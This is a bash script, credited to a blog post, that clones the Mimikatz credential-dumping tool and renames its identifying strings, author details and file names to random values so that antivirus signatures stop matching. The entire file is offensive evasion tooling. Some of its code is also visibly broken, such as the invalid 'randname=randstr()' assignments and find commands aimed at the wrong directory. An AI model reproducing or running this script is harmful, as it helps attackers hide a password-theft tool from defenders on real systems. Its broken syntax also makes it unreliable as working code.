#!/bin/bash

# Original: https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/

if [[ -z $1 ]]; then
    echo './mimikatz-clone-obfuscated.sh'
    exit 1
fi


randstr(){< /dev/urandom tr -dc a-zA-Z0-9 | head -c${1:-8};}

randname=randstr()
RANDNAME=${randname^^}
Randname=${randname^}
randname2=randstr()
RANDNAME2=${randname2^^}
Randname2=${randname2^}

git clone https://github.com/gentilkiwi/mimikatz.git $randname
mv $randname/mimikatz $randname/$randname
find windows/ -type f -print0 | xargs -0 sed -i "s/mimikatz/$randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/MIMIKATZ/$RANDNAME/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/Mimikatz/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/DELPY/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/Benjamin/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/benjamin@gentilkiwi.com/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/creativecommons/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/gentilkiwi/$Randname/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/kiwi/$randname2/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/KIWI/$RANDNAME2/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/Kiwi/$Randname2/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/A La Vie/$(randstr)/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/Amour/$(randstr)/g"
find windows/ -type f -print0 | xargs -0 sed -i "s/mimidrv/$(randstr)/g"
find windows/ -type f -name '*mimikatz*' | while read FILE ; do
    newfile="$(echo ${FILE} |sed -e "s/mimikatz/$randname/g")";
    mv "${FILE}" "${newfile}";
done
find windows/ -type f -name '*kiwi*' | while read FILE ; do
    newfile="$(echo ${FILE} |sed -e "s/kiwi/$randname2/g")";
    mv "${FILE}" "${newfile}";
done